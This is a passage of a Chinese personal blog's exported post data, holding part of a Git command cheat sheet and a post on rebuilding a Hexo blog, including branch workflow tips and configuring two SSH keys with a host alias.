在当前目录新建一个Git代码库</span>$ <span class="token function">git</span> init<span class="token comment" spellcheck="true"># 新建一个目录，将其初始化为Git代码库</span>$ <span class="token function">git</span> init <span class="token punctuation">[</span>project-name<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># 下载一个项目和它的整个代码历史</span>$ <span class="token function">git</span> clone <span class="token punctuation">[</span>url<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="增加-删除文件"><a href="#增加-删除文件" class="headerlink" title="增加/删除文件"></a>增加/删除文件</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 添加指定文件到暂存区</span>$ <span class="token function">git</span> add <span class="token punctuation">[</span>file1<span class="token punctuation">]</span> <span class="token punctuation">[</span>file2<span class="token punctuation">]</span> <span class="token punctuation">..</span>.<span class="token comment" spellcheck="true"># 添加指定目录到暂存区，包括子目录</span>$ <span class="token function">git</span> add <span class="token punctuation">[</span>dir<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># 添加当前目录的所有文件到暂存区</span>$ <span class="token function">git</span> add <span class="token keyword">.</span><span class="token comment" spellcheck="true"># 添加每个变化前，都会要求确认</span><span class="token comment" spellcheck="true"># 对于同一个文件的多处变化，可以实现分次提交</span>$ <span class="token function">git</span> add -p<span class="token comment" spellcheck="true"># 删除工作区文件，并且将这次删除放入暂存区</span>$ <span class="token function">git</span> <span class="token function">rm</span> <span class="token punctuation">[</span>file1<span class="token punctuation">]</span> <span class="token punctuation">[</span>file2<span class="token punctuation">]</span> <span class="token punctuation">..</span>.<span class="token comment" spellcheck="true"># 停止追踪指定文件，但该文件会保留在工作区</span>$ <span class="token function">git</span> <span class="token function">rm</span> --cached <span class="token punctuation">[</span>file<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># 改名文件，并且将这个改名放入暂存区</span>$ <span class="token function">git</span> <span class="token function">mv</span> <span class="token punctuation">[</span>file-original<span class="token punctuation">]</span> <span class="token punctuation">[</span>file-renamed<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="代码提交"><a href="#代码提交" class="headerlink" title="代码提交"></a>代码提交</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 提交暂存区到仓库区</span>$ <span class="token function">git</span> commit -m <span class="token punctuation">[</span>message<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># 提交暂存区的指定文件到仓库区</span>$ <span class="token function">git</span> commit <span class="token punctuation">[</span>file1<span class="token punctuation">]</span> <span class="token punctuation">[</span>file2<span class="token punctuation">]</span> <span class="token punctuation">..</span>. -m <span class="token punctuation">[</span>message<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># 提交工作区自上次commit之后的变化，直接到仓库区</span>$ <span class="token function">git</span> commit -a<span class="token comment" spellcheck="true"># 提交时显示所有diff信息</span>$ <span class="token function">git</span> commit -v<span class="token comment" spellcheck="true"># 使用一次新的commit，替代上一次提交</span><span class="token comment" spellcheck="true"># 如果代码没有任何新变化，则用来改写上一次commit的提交信息</span>$ <span class="token function">git</span> commit --amend -m <span class="token punctuation">[</span>message<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># 重做上一次commit，并包括指定文件的新变化</span>$ <span class="token function">git</span> commit --amend <span class="token punctuation">[</span>file1<span class="token punctuation">]</span> <span class="token punctuation">[</span>file2<span class="token punctuation">]</span> <span class="token punctuation">..</span>.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="分支"><a href="#分支" class="headerlink" title="分支"></a>分支</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 列出所有本地分支</span>$ <span class="token function">git</span> branch<span class="token comment" spellcheck="true"># 列出所有远程分支</span>$ <span class="token function">git</span> branch -r<span class="token comment" spellcheck="true"># 列出所有本地分支和远程分支</span>$ <span class="token function">git</span> branch -a<span class="token comment" spellcheck="true"># 新建一个分支，但依然停留在当前分支</span>$ <span class="token function">git</span> branch <span class="token punctuation">[</span>branch-name<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># 新建一个分支，并切换到该分支</span>$ <span class="token function">git</span> checkout -b <span class="token punctuation">[</span>branch<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># 新建一个分支，指向指定commit</span>$ <span class="token function">git</span> branch <span class="token punctuation">[</span>branch<span class="token punctuation">]</span> <span class="token punctuation">[</span>commit<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># 新建一个分支，与指定的远程分支建立追踪关系</span>$ <span class="token function">git</span> branch --track <span class="token punctuation">[</span>branch<span class="token punctuation">]</span> <span class="token punctuation">[</span>remote-branch<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># 切换到指定分支，并更新工作区</span>$ <span class="token function">git</span> checkout <span class="token punctuation">[</span>branch-name<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># 切换到上一个分支</span>$ <span class="token function">git</span> checkout -<span class="token comment" spellcheck="true"># 建立追踪关系，在现有分支与指定的远程分支之间</span>$ <span class="token function">git</span> branch --set-upstream-to<span class="token operator">=</span>origin/<span class="token punctuation">[</span>branch<span class="token punctuation">]</span> <span class="token punctuation">[</span>remote-branch<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># 合并指定分支到当前分支</span>$ <span class="token function">git</span> merge <span class="token punctuation">[</span>branch<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># 选择一个commit，合并进当前分支</span>$ <span class="token function">git</span> cherry-pick <span class="token punctuation">[</span>commit<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># 删除分支</span>$ <span class="token function">git</span> branch -d <span class="token punctuation">[</span>branch-name<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># 删除远程分支</span>$ <span class="token function">git</span> push origin --delete <span class="token punctuation">[</span>branch-name<span class="token punctuation">]</span>$ <span class="token function">git</span> branch -dr <span class="token punctuation">[</span>remote/branch<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 列出所有tag</span>$ <span class="token function">git</span> tag<span class="token comment" spellcheck="true"># 新建一个tag在当前commit</span>$ <span class="token function">git</span> tag <span class="token punctuation">[</span>tag<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># 新建一个tag在指定commit</span>$ <span class="token function">git</span> tag <span class="token punctuation">[</span>tag<span class="token punctuation">]</span> <span class="token punctuation">[</span>commit<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># 删除本地tag</span>$ <span class="token function">git</span> tag -d <span class="token punctuation">[</span>tag<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># 删除远程tag</span>$ <span class="token function">git</span> push origin :refs/tags/<span class="token punctuation">[</span>tagName<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># 查看tag信息</span>$ <span class="token function">git</span> show <span class="token punctuation">[</span>tag<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># 提交指定tag</span>$ <span class="token function">git</span> push <span class="token punctuation">[</span>remote<span class="token punctuation">]</span> <span class="token punctuation">[</span>tag<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># 提交所有tag</span>$ <span class="token function">git</span> push <span class="token punctuation">[</span>remote<span class="token punctuation">]</span> --tags<span class="token comment" spellcheck="true"># 新建一个分支，指向某个tag</span>$ <span class="token function">git</span> checkout -b <span class="token punctuation">[</span>branch<span class="token punctuation">]</span> <span class="token punctuation">[</span>tag<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="查看信息"><a href="#查看信息" class="headerlink" title="查看信息"></a>查看信息</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 显示有变更的文件</span>$ <span class="token function">git</span> status<span class="token comment" spellcheck="true"># 显示当前分支的版本历史</span>$ <span class="token function">git</span> log<span class="token comment" spellcheck="true"># 显示commit历史，以及每次commit发生变更的文件</span>$ <span class="token function">git</span> log --stat<span class="token comment" spellcheck="true"># 搜索提交历史，根据关键词</span>$ <span class="token function">git</span> log -S <span class="token punctuation">[</span>keyword<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># 显示某个commit之后的所有变动，每个commit占据一行</span>$ <span class="token function">git</span> log <span class="token punctuation">[</span>tag<span class="token punctuation">]</span> HEAD --pretty<span class="token operator">=</span>format:%s<span class="token comment" spellcheck="true"># 显示某个commit之后的所有变动，其"提交说明"必须符合搜索条件</span>$ <span class="token function">git</span> log <span class="token punctuation">[</span>tag<span class="token punctuation">]</span> HEAD --grep feature<span class="token comment" spellcheck="true"># 显示某个文件的版本历史，包括文件改名</span>$ <span class="token function">git</span> log --follow <span class="token punctuation">[</span>file<span class="token punctuation">]</span>$ <span class="token function">git</span> whatchanged <span class="token punctuation">[</span>file<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># 显示指定文件相关的每一次diff</span>$ <span class="token function">git</span> log -p <span class="token punctuation">[</span>file<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># 显示过去5次提交</span>$ <span class="token function">git</span> log -5 --pretty --oneline<span class="token comment" spellcheck="true"># 显示所有提交过的用户，按提交次数排序</span>$ <span class="token function">git</span> shortlog -sn<span class="token comment" spellcheck="true"># 显示指定文件是什么人在什么时间修改过</span>$ <span class="token function">git</span> blame <span class="token punctuation">[</span>file<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># 显示暂存区和工作区的差异</span>$ <span class="token function">git</span> <span class="token function">diff</span><span class="token comment" spellcheck="true"># 显示暂存区和上一个commit的差异</span>$ <span class="token function">git</span> <span class="token function">diff</span> --cached <span class="token punctuation">[</span>file<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># 显示工作区与当前分支最新commit之间的差异</span>$ <span class="token function">git</span> <span class="token function">diff</span> HEAD<span class="token comment" spellcheck="true"># 显示两次提交之间的差异</span>$ <span class="token function">git</span> <span class="token function">diff</span> <span class="token punctuation">[</span>first-branch<span class="token punctuation">]</span><span class="token punctuation">..</span>.<span class="token punctuation">[</span>second-branch<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># 显示今天你写了多少行代码</span>$ <span class="token function">git</span> <span class="token function">diff</span> --shortstat <span class="token string">"@{0 day ago}"</span><span class="token comment" spellcheck="true"># 显示某次提交的元数据和内容变化</span>$ <span class="token function">git</span> show <span class="token punctuation">[</span>commit<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># 显示某次提交发生变化的文件</span>$ <span class="token function">git</span> show --name-only <span class="token punctuation">[</span>commit<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># 显示某次提交时，某个文件的内容</span>$ <span class="token function">git</span> show <span class="token punctuation">[</span>commit<span class="token punctuation">]</span>:<span class="token punctuation">[</span>filename<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># 显示当前分支的最近几次提交</span>$ <span class="token function">git</span> reflog<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="远程同步"><a href="#远程同步" class="headerlink" title="远程同步"></a>远程同步</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 下载远程仓库的所有变动</span>$ <span class="token function">git</span> fetch <span class="token punctuation">[</span>remote<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># 显示所有远程仓库</span>$ <span class="token function">git</span> remote -v<span class="token comment" spellcheck="true"># 显示某个远程仓库的信息</span>$ <span class="token function">git</span> remote show <span class="token punctuation">[</span>remote<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># 增加一个新的远程仓库，并命名</span>$ <span class="token function">git</span> remote add <span class="token punctuation">[</span>shortname<span class="token punctuation">]</span> <span class="token punctuation">[</span>url<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># 取回远程仓库的变化，并与本地分支合并</span>$ <span class="token function">git</span> pull <span class="token punctuation">[</span>remote<span class="token punctuation">]</span> <span class="token punctuation">[</span>branch<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># 上传本地指定分支到远程仓库</span>$ <span class="token function">git</span> push <span class="token punctuation">[</span>remote<span class="token punctuation">]</span> <span class="token punctuation">[</span>branch<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># 强行推送当前分支到远程仓库，即使有冲突</span>$ <span class="token function">git</span> push <span class="token punctuation">[</span>remote<span class="token punctuation">]</span> --force<span class="token comment" spellcheck="true"># 推送所有分支到远程仓库</span>$ <span class="token function">git</span> push <span class="token punctuation">[</span>remote<span class="token punctuation">]</span> --all<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="撤销"><a href="#撤销" class="headerlink" title="撤销"></a>撤销</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 恢复暂存区的指定文件到工作区</span>$ <span class="token function">git</span> checkout <span class="token punctuation">[</span>file<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># 恢复某个commit的指定文件到暂存区和工作区</span>$ <span class="token function">git</span> checkout <span class="token punctuation">[</span>commit<span class="token punctuation">]</span> <span class="token punctuation">[</span>file<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># 恢复暂存区的所有文件到工作区</span>$ <span class="token function">git</span> checkout <span class="token keyword">.</span><span class="token comment" spellcheck="true"># 重置暂存区的指定文件，与上一次commit保持一致，但工作区不变</span>$ <span class="token function">git</span> reset <span class="token punctuation">[</span>file<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># 重置暂存区与工作区，与上一次commit保持一致</span>$ <span class="token function">git</span> reset --hard<span class="token comment" spellcheck="true"># 重置当前分支的指针为指定commit，同时重置暂存区，但工作区不变</span>$ <span class="token function">git</span> reset <span class="token punctuation">[</span>commit<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># 重置当前分支的HEAD为指定commit，同时重置暂存区和工作区，与指定commit一致</span>$ <span class="token function">git</span> reset --hard <span class="token punctuation">[</span>commit<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># 重置当前HEAD为指定commit，但保持暂存区和工作区不变</span>$ <span class="token function">git</span> reset --keep <span class="token punctuation">[</span>commit<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># 新建一个commit，用来撤销指定commit</span><span class="token comment" spellcheck="true"># 后者的所有变化都将被前者抵消，并且应用到当前分支</span>$ <span class="token function">git</span> revert <span class="token punctuation">[</span>commit<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># 暂时将未提交的变化移除，稍后再移入</span>$ <span class="token function">git</span> stash$ <span class="token function">git</span> stash pop<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="常用技巧"><a href="#常用技巧" class="headerlink" title="常用技巧"></a>常用技巧</h2><h3 id="help命令"><a href="#help命令" class="headerlink" title="help命令"></a>help命令</h3><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">git</span> --help<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/img/image-20210202221721129.png" alt="image-20210202221721129"></p><h3 id="status命令"><a href="#status命令" class="headerlink" title="status命令"></a>status命令</h3><p>当你不知道该怎么的时候，就可以<code>git status</code>一下，他就会提示展示出当前文件状态以及给出建议，这样就不会懵逼了&gt;_&gt;</p><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">git</span> status<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
            <tag> 教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>重建博客</title>
      <link href="/2021/02/01/2021-2-1-chong-jian-bo-ke/"/>
      <url>/2021/02/01/2021-2-1-chong-jian-bo-ke/</url>
      
        <content type="html"><![CDATA[<h1 id="简短介绍"><a href="#简短介绍" class="headerlink" title="简短介绍"></a>简短介绍</h1><p>倒腾了一两周总算把个人博客网站完善了，目前这个版本使用应该是够了，当然还有一些优化项和功能增加后续在慢慢更新。</p><p>本博客基于<code>Hexo</code>框架搭建，用到模板基础为<a href="https://github.com/shw2018/hexo-theme-matery" target="_blank" rel="noopener">hexo-theme-matery</a>主题,并在此基础之上做了很多修改的洪卫大佬的<a href="https://github.com/shw2018/hexo-blog-fly.git" target="_blank" rel="noopener">hexo-blog-fly</a>主题，做了一些个性化修改。洪卫大佬博客地址：<a href="https://shw2018.github.io/" target="_blank" rel="noopener">https://shw2018.github.io</a>，博客演示：<a href="https://sunhwee.com" target="_blank" rel="noopener">sunhwee.com</a>。</p><hr><h2 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h2><p><strong>原 matery 主题特性</strong>:</p><ul><li><p>简单漂亮，文章内容美观易读</p></li><li><p><a href="https://material.io/" target="_blank" rel="noopener">Material Design</a> 设计</p></li><li><p>响应式设计，博客在桌面端、平板、手机等设备上均能很好的展现</p></li><li><p>首页轮播文章及每天动态切换 <code>Banner</code> 图片</p></li><li><p>瀑布流式的博客文章列表（文章无特色图片时会有 <code>24</code> 张漂亮的图片代替）</p></li><li><p>时间轴式的归档页</p></li><li><p><strong>词云</strong>的标签页和<strong>雷达图</strong>的分类页</p></li><li><p>丰富的关于我页面（包括关于我、文章统计图、我的项目、我的技能、相册等）</p></li><li><p>可自定义的数据的友情链接页面</p></li><li><p>支持文章置顶和文章打赏</p></li><li><p>支持 <code>MathJax</code></p></li><li><p><code>TOC</code> 目录</p></li><li><p>可设置复制文章内容时追加版权信息</p></li><li><p>可设置阅读文章时做密码验证</p></li><li><p><a href="https://gitalk.github.io/" target="_blank" rel="noopener">Gitalk</a>、<a href="https://imsun.github.io/gitment/" target="_blank" rel="noopener">Gitment</a>、<a href="https://valine.js.org/" target="_blank" rel="noopener">Valine</a> 和 <a href="https://disqus.com/" target="_blank" rel="noopener">Disqus</a> 评论模块（推荐使用 <code>Gitalk</code>）</p></li><li><p>集成了<a href="http://busuanzi.ibruce.info/" target="_blank" rel="noopener">不蒜子统计</a>、谷歌分析（<code>Google Analytics</code>）和文章字数统计等功能</p></li><li><p>支持在首页的音乐播放和视频播放功能</p><p><strong>增加的工作或特性(未打钩的是已做但还没更新到源码的)</strong>:</p></li><li><p>修改了原主题的一些<code>bug</code>   2019.08.05</p></li><li><p>加入图片懒加载功能，在根目录配置文件开启和关闭    2019.08.09</p></li><li><p>增加<code>留言板</code>功能          2019.08.05</p></li><li><p>在关于板块,加入<code>简历</code>功能页   2019.08.05</p></li><li><p>增加视听[视觉听觉影音]板块       2019.08.10</p></li><li><p>支持<code>emoji</code>表情，用<code>markdown emoji</code>语法书写直接生成对应的能<strong>跳跃</strong>的表情。  2019.08.10</p></li><li><p>增加网站运行时间显示  2019.08.10</p></li><li><p>增加<code>动漫模型</code>     2019.08.10</p></li><li><p>整体替换Banner图片和文章特色图片   2019.08.10</p></li><li><p>增加分类<code>相册</code>功能         2019.08.29</p></li><li><p>去掉标签页,将其合并至<code>分类</code>页中                2019.09.01</p></li><li><p>修改了一些控件的参数   2019.09.01</p></li><li><p>修改部分样式,比如: 文章卡片,固定高度,使其不至于因为文章摘要的长短不同导致卡片大小不一使页面布局很不美观,类似的还有友链卡片,优化了页面内容布局,视觉更整齐美观          2019.09.01</p></li><li><p>解决首页文章列表卡片上方 <code>border-radius</code>圆角失效的bug  2019.09.01</p></li><li><p>添加页面樱花飘落动效            2019.09.09</p></li><li><p>添加鼠标点击烟花爆炸动效   2019.09.09</p></li><li><p>加入天气接口控件   2019.09.09</p></li><li><p>加入鼠标点击文字特效   2019.09.10</p></li><li><p>添加页面雪花飘落动效            2019.09.10</p></li><li><p>添加在线聊天插件            2019.09.12</p></li><li><p>持续更新…</p></li></ul><hr><p><strong>简单使用方法：</strong></p><ol><li><p><code>star</code> 本项目</p></li><li><p>安装<a href="https://git-scm.com/downloads" target="_blank" rel="noopener">Git</a>, 安装<a href="https://nodejs.org/en/" target="_blank" rel="noopener">nodeJS</a></p></li><li><p>你可以直接<code>fork</code>一份源码到你的仓库，<code>clone</code>到本地</p></li><li><p>在本地博客仓库运行<code>npm i</code>命令安装依赖包</p></li><li><p>修改配置信息，改成自己的信息</p></li><li><p>运行命令<code>hexo  clean</code>（清除生成文件），<code>hexo g</code>（生成网页）， <code>hexo  s</code>（本地预览），<code>hexo d</code>（部署）</p></li></ol><h2 id="博客模板源文件使用方法详解"><a href="#博客模板源文件使用方法详解" class="headerlink" title="博客模板源文件使用方法详解"></a>博客模板源文件使用方法详解</h2><p>这两天为了解决协会博客的奇葩问题和重建自己的博客真是查了不少资料，恶补了一波git，算是基本弄清楚了git的简单使用原理以及hexo这种博客模板的基本结构和工作原理（当然也只是会用不会写，刚刚试图魔改就失败了，害）。</p><p><strong>hexo博客目录结构</strong></p><pre><code>- node_modules        //node.js库文件按- public        //hexo d 发布的目录- scaffolds        //hexo 模板文件- source        //网站源码    - _data    - _posts    - about    - archives    - categories    - friends    - tags- themes        //主题源码</code></pre><p>而一个现成的博客模板的核心文件只有五个</p><pre><code>scaffoldssourcethemes_config.ymlpackage.json</code></pre><p>除了这五个，其它的文件都是附加产品</p><p>把一个博客模板clone到本地仓库后，只有这五个文件是必须的，其它的都可以删了，然后使用</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> hexo    //安装hexo框架<span class="token function">npm</span> <span class="token function">install</span>        //安装必要插件<span class="token function">npm</span> <span class="token function">install</span> hexo-deployer-git        //安装hexo的deployer插件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>如果clone下来的源码有<code>node_modules</code>，<code>package-lock.json</code>，<code>db.json</code>文件的话，则只要使用<code>npm install</code>命令即可，如果有问题的话，就把其它的东西删掉，留下五个核心文件，再跑一遍上面三个命令就行</p><p>如果是第一次搭建博客的话，这里有一个关键技巧，<strong>以上操作切换到hexo分支上进行，然后保证<code>_config.yml</code>文件中的deploy参数中的branch（分支）参数为<code>master</code></strong>。</p><pre><code>git checkout -b hexo        //新建并切换到hexo分支</code></pre><p>这样就可以使得<code>hexo d</code>上传的分支为master分支，而源码push的分支为<code>hexo</code>。我们就可以实现在一个仓库中通过两个不同分支同时保存网站和源码（记得把github pages调到master分支上，2020年以后github的默认分支变成了main分支）</p><p>每次在提交博客前，先使用“git”三连上传源码备份</p><pre><code>git add.git commit -m "message"git push origin hexo        //切记这里是hexo分支</code></pre><p>养成好习惯</p><p>然后再用<code>hexo g -d</code>命令提交博客</p><p>这里还有一个小技巧，万一哪天太久没写博客或者脑抽忘了在push后面加上 origin hexo，那可就麻烦大了，虽然有补救措施，但我们应该避免这种麻烦</p><p>这时可以使用</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">git</span> branch --set-upstream-to<span class="token operator">=</span>origin/hexo hexo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这条命令指定hexo分支的默认远程上传仓库为hexo，这样hexo 默认<code>git push</code>的就是 hexo分支，大大降低手残操作带来的麻烦的可能性。</p><h2 id="在一个电脑上使用两个ssh的方法"><a href="#在一个电脑上使用两个ssh的方法" class="headerlink" title="在一个电脑上使用两个ssh的方法"></a>在一个电脑上使用两个ssh的方法</h2><p>有时候我们会遇到这种情况，手上有两个git账号要管理，一个私人的一个公有的（或者干脆就有两个私人的），但使用ssh远程连接时会遇到问题。</p><p>一个ssh密钥只能连接一个账户或者仓库，这使我们管理两个账户时非常不方便，一个用了ssh以后另外一个就不能用了</p><p>这时的解决方法是利用config文件再创建一个ssh密钥并指定主机别名来连接远程git账户（无论是github还是别的git服务器都可以）</p><p>用git bash或者命令行打开系统盘“用户”目录下的.ssh文件</p><pre class="line-numbers language-bash"><code class="language-bash">ssh-keygen -t rsa -C <span class="token string">"这里输入邮箱，其实输啥都行"</span>        //创建新ssh密钥Generating public/private rsa key pair.Enter <span class="token function">file</span> <span class="token keyword">in</span> <span class="token function">which</span> to save the key <span class="token punctuation">(</span>/Users/Apple/.ssh/id_rsa<span class="token punctuation">)</span>: <span class="token punctuation">[</span>输入密钥文件名，直接回车就是括号中的默认名称<span class="token punctuation">]</span>      //创建第二个ssh密钥不能使用默认的了，我为协会博客创建了一个id_rsa_ais,这个名字可以随便取        /Users/xxx/.ssh/id_rsa_aisEnter passphrase <span class="token punctuation">(</span>empty <span class="token keyword">for</span> no passphrase<span class="token punctuation">)</span>:         //添加密码，建议直接回车，使用ssh就是为了省事和安全，再加个密码多此一举了Enter same passphrase again: Your identification has been saved <span class="token keyword">in</span> /Users/Apple/.ssh/id_rsa_ais.    //私钥Your public key has been saved <span class="token keyword">in</span> /Users/Apple/.ssh/id_rsa_ais.pub. //公钥The key fingerprint is:SHA256:1gepuxDHwJRnFbKvc0Zq/NGrFGE9kEXS06jxatPPrSQ xxx@xxx.com //你刚刚输入的邮箱The key's randomart image is:+---<span class="token punctuation">[</span>RSA 2048<span class="token punctuation">]</span>----+<span class="token operator">|</span>      <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token operator">=</span>*oo   <span class="token operator">|</span><span class="token operator">|</span>     o. ooo<span class="token operator">=</span>+ <span class="token keyword">.</span>  <span class="token operator">|</span><span class="token operator">|</span>      oo. <span class="token operator">=</span>+o.   <span class="token operator">|</span><span class="token operator">|</span>       o <span class="token operator">=</span>.o<span class="token punctuation">..</span>   <span class="token operator">|</span><span class="token operator">|</span>      <span class="token keyword">.</span> S <span class="token operator">=</span>o.    <span class="token operator">|</span><span class="token operator">|</span>       <span class="token operator">=</span> <span class="token operator">=</span>++.    <span class="token operator">|</span><span class="token operator">|</span>      <span class="token keyword">.</span> B.<span class="token operator">=</span>.Eo<span class="token punctuation">..</span> <span class="token operator">|</span><span class="token operator">|</span>       o B <span class="token keyword">.</span> +o <span class="token keyword">.</span><span class="token operator">|</span><span class="token operator">|</span>          <span class="token keyword">.</span> o<span class="token punctuation">..</span> <span class="token punctuation">..</span> <span class="token operator">|</span>+----<span class="token punctuation">[</span>SHA256<span class="token punctuation">]</span>-----+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>自己把ssh公钥上传到远程git服务器上去</p><p>然后打开.ssh文件中的config文件（没有就自己创建一个）</p><p>添加如下代码</p><pre><code>#Default GitHub  Host github.com        //主机名称  HostName github.com    //主机  User git  IdentityFile ~/.ssh/id_rsa    //密钥文件  Host github-wustais    //同上，这里相当于为github.com起了个别名，使用这个别名的时候用的密钥文件就会是id_rsa_ais  HostName github.com  User git  IdentityFile ~/.ssh/id_rsa_ais    //这里你刚刚创建的密钥文件叫什么就改成什么</code></pre><p>然后</p><p><strong>将GitHub SSH仓库地址中的<a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a>替换成新建的Host别名。</strong></p><pre><code>//修改之前$ git remote -vgithub  git@github.com:xxx/xxx.git (fetch)github  git@github.com:xxx/xxx.git (push)//这里如果你是使用https方式clone的仓库的话，显示的是https://github.com/xxx/xxx.git,对后续操作没什么影响//修改 remote set-url$ git remote set-url github  github-wustais:xxx/xxx.git</code></pre><p>验证</p><pre><code>//使用修改后的github-wustais SSH连接，连接成功用户是协会账户，此时公钥是id_rsa_ais$ ssh -T github-wustais    //这里写成git@github-wustais也行Hi xxx! You've successfully authenticated, but GitHub does not provide shell access.    //这就是成功了，后面这句话是告诉你你没有远程操作控制台的许可，因为用了命令中用了-T参数//使用默认的git@github.com SSH去连接,连接成功用户是我的私有账户，此时公钥是id_rsa$ ssh -T git@github.comHi 